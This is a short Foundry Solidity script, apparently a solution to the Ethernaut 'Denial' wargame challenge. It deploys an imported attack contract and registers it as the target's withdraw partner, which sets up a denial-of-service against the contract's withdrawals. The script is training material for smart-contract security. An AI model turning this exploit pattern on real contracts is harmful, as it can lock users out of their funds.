// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/DenialAttack.sol";

interface IDenial {
    function setWithdrawPartner(address _partner) external;
}

contract DenialSolve is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ETH_PRIVATE_KEY");
        address instanceAddress = vm.envAddress("INSTANCE_ADDRESS");

        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署攻擊合約
        AttackDenial attacker = new AttackDenial(instanceAddress);
        console.log("Attacker deployed at:", address(attacker));

        // 2. 設定為 Partner
        IDenial(instanceAddress).setWithdrawPartner(address(attacker));
        console.log("Partner set to attacker!");

        vm.stopBroadcast();
    }
}
